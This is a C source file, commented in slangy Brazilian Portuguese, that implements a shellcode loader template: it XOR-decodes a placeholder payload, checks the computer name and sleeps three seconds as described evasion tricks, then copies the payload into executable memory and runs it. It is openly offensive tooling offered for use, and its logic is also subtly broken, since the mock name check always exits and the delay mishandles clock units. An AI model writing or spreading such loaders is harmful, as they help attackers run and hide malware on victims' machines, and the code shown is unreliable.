#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <time.h>

// Função pra pegar o nome do PC, na moral, isso é só um mock pra brincar, tá ligado?
char* getComputerName() {
    static char computername[] = "YOUR_COMPUTER_NAME";  // Nome do PC fake pra teste
    return computername;
}

// Funçãozinha pra dar uma enrolada na execução, tipo evasão de timing, sacou?
void delay(int number_of_seconds) {
    int milli_seconds = 1000 * number_of_seconds;
    clock_t start_time = clock();
    // Loop tosco pra esperar o tempo passar
    while (clock() < start_time + milli_seconds);
}

// Função marota de ofuscação usando XOR, coisa básica mas quebra um galho
void xor_encode_decode(char *data, size_t data_len, char key) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key;  // XOR na molecada, vai codificando e decodificando suave
    }
}

int main() {
    // Aqui é o shellcode que a gente vai ofuscar, troque pelo seu, firmeza?
    char shellcode[] = "YOUR_SHELLCODE_HERE";
    size_t shellcode_len = sizeof(shellcode) - 1;
    char key = 0x41;  // Chave pra fazer o XOR, bem na tranquilidade

    // Pega o nome do PC
    char *computername = getComputerName();
    // Se o nome do PC é "YOUR_COMPUTER_NAME", cai fora mano
    if (!strcmp(computername, "YOUR_COMPUTER_NAME")) {
        printf("Nome do PC é YOUR_COMPUTER_NAME, vaza daí.\n");
        return 1;
    }

    // Dá uma enrolada de 3 segundos pra despistar os curiosos
    delay(3);

    // Decodifica o shellcode usando nosso XOR, bem manjado
    xor_encode_decode(shellcode, shellcode_len, key);

    // Aloca memória e copia o shellcode pra lá, modo ninja
    void *exec = mmap(NULL, shellcode_len, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (exec == MAP_FAILED) {
        printf("Deu ruim na alocação de memória.\n");
        return 1;
    }

    memcpy(exec, shellcode, shellcode_len);  // Cola o shellcode na memória alocada

    // Agora é só mandar o shellcode rodar, simples e eficiente
    ((void(*)())exec)();

    return 0;  // E fim de papo, programa terminou de boa
}
